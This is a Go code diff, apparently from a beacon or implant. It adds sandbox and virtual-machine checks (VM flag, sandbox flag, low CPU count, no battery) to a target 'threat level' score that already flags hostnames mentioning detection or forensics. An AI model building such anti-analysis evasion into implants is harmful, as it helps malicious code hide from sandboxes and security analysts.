@@ -38,6 +38,7 @@ func (p *Profiler) Profile(cooldown time.Duration) *beacon.TargetProfile {
 	phase1(prof)
 	phase2(prof)
 	phase3(prof)
+	phase4(prof)
 
 	prof.ThreatLevel = assessThreatLevel(prof)
 
@@ -99,6 +100,20 @@ func assessThreatLevel(p *beacon.TargetProfile) string {
 			strings.Contains(hn, "detection") || strings.Contains(hn, "forensic") {
 			score += 20
 		}
+	}
+
+	// VM/sandbox indicators
+	if p.IsVM {
+		score += 5
+		if p.IsSandbox {
+			score += 15
+		}
+	}
+	if p.CPUCount > 0 && p.CPUCount < 2 {
+		score += 10
+	}
+	if !p.HasBattery && p.IsVM {
+		score += 5
 	}
 
 	switch {
